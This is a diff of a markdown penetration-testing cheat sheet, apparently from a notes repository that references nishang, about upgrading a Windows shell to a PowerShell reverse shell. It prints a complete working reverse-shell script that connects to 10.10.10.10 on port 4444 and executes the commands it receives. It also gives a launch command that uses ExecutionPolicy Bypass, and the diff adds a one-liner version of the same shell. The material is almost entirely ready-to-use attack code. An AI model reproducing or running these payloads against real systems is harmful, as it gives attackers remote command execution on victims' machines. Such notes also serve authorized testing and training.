@@ -134,7 +134,7 @@ https://github.com/samratashok/nishang
 ### Upgrade Windows Command Line with Powershell Reverse Shell:
 
 You can either upload the following Reverse shell (note you will need to se the IP and Port correctly):
-ReverseShell.ps1
+*ReverseShell.ps1*  
 ```
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()             
 ```
@@ -143,9 +143,9 @@ Then run the Powershell command from the Windows Command line like so:
 powershell -NoProfile -InputFormat None -ExecutionPolicy Bypass -noexit "& ""C:\Users\Public\Downloads\ReverseShell.ps1""" 
 ```
 
-*OR* you can run this oneliner from the Windows command prompt to skip the file upload step entirely:
+*OR* you can run this oneliner from the Windows command prompt to skip the file upload step entirely (again be sure to update the IP and port):
 ```
-
+@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$client = New-Object System.Net.Sockets.TCPClient(\"10.10.10.10\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"^> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
 ```
 
 
